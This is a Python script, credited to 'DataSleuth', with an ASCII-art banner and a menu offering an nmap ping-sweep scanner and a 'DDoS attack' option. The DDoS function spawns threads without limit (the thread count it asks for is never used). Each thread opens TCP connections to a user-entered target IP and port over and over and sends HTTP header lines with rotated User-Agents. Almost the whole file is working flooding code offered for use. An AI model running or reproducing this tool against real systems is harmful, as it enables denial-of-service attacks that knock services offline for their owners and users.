from colorama import init
from termcolor import colored
import socket
import threading
import random
import nmap
import time

init()

print(colored("""
              .__                .__                            
______   ____ |  |   ____   ____ |  |__   ____   ____  
\____ \ /  _ \|  |  /  _ \_/ ___\|  |  \ /  _ \ /    \\ 
|  |_> >  <_> )  |_(  <_> )  \___|   Y  (  <_> )   |  \\ 
|   __/ \____/|____/\____/ \___  >___|  /\\____/|___|  /\\
|__|                           \/     \\/            \\/ 
                                                        """, 'green'))

print(colored("Created by DataSleuth", 'cyan'))
exit_flag = threading.Event()

def network_scanner(target_ip):
    print(colored(f"Pinging {target_ip}...", 'yellow'))

    try:
        nm = nmap.PortScanner()
        nm.scan(hosts=target_ip, arguments='-sn')

        for host in nm.all_hosts():
            if nm[host].state() == 'up':
                print(colored(f"Host {host} is up", 'green'))
            else:
                print(colored(f"Host {host} is down", 'red'))

    except Exception as e:
        print(colored(f"An error occurred during the scan: {e}", 'red'))


def ddos(target_ip, target_port, num_threads):
    def ddos_attack(thread_number):
        request_counter = 0
        while not exit_flag.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                # Generate random headers with a large variety of User-Agents
                user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.48",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.48",
                    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
                    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:90.0) Gecko/20100101 Firefox/90.0",
                    # Add more User-Agents as needed
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.122 Safari/537.36",
                    # Add more User-Agents as needed
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 Edg/83.0.478.37",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36",
                    # Add more User-Agents as needed
                ]
                user_agent = random.choice(user_agents)
                headers = [
                    f"GET / HTTP/1.1\r\n",
                    f"Host: {target_ip}\r\n",
                    f"User-Agent: {user_agent}\r\n",
                    "Accept-Language: en-US,en;q=0.5\r\n",
                    "Connection: keep-alive\r\n",
                    "Upgrade-Insecure-Requests:"
                    "Cache-Control: max-age=0\r\n\r\n"
                ]

                # Randomly select a User-Agent for each request
                request = random.choice(headers)

                s.connect((target_ip, target_port))
                s.send(request.encode())
                s.close()

                request_counter += 1
                print(f"Thread {thread_number} - Requests sent: {request_counter}", end='\r', flush=True)

            except socket.error:
                pass


    try:
        while True:
            t = threading.Thread(target=ddos_attack, args=(random.randint(1, 1000000),))
            t.daemon = True
            t.start()
            time.sleep(0.01)  
    except KeyboardInterrupt:
        print("Stopping DDoS attack...")
        exit_flag.set()
        time.sleep(2)  

    print("DDoS attack stopped.")

def main():
    target_ip = input(colored("Enter the target IP address: ", 'yellow'))
    target_port = int(input("Enter the target port: "))  

    
    time.sleep(0.1)

    while True:
       
        print("\033c")
        
        print("Options:")
        print("1- Network scanner")
        print("2- DDoS attack")
        print("3- Exit")

        choice = input("Please choose a number: ")

        if choice == '1':
            network_scanner(target_ip)
        elif choice == '2':
            num_threads = int(input("Enter the number of threads: "))
            ddos(target_ip, target_port, num_threads)
        elif choice == '3':
            exit()
        else:
            print("Invalid choice. Please select a valid option.")

        time.sleep(0.1) 

if __name__ == "__main__":
    main()







